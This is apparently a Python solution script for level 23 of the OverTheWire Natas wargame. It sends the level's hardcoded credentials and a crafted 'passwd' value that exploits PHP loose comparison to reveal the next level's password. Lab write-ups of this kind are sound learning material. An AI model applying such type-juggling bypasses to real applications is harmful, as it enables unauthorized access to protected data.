#!/usr/bin/env python3

import requests
import re

username = 'natas23'
password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth = (username, password))
response = session.post(url, data = { "passwd": "11iloveyou" }, auth = (username, password))
# print(response.text)
print(re.findall('Password: (.*)</pre>', response.text)[0])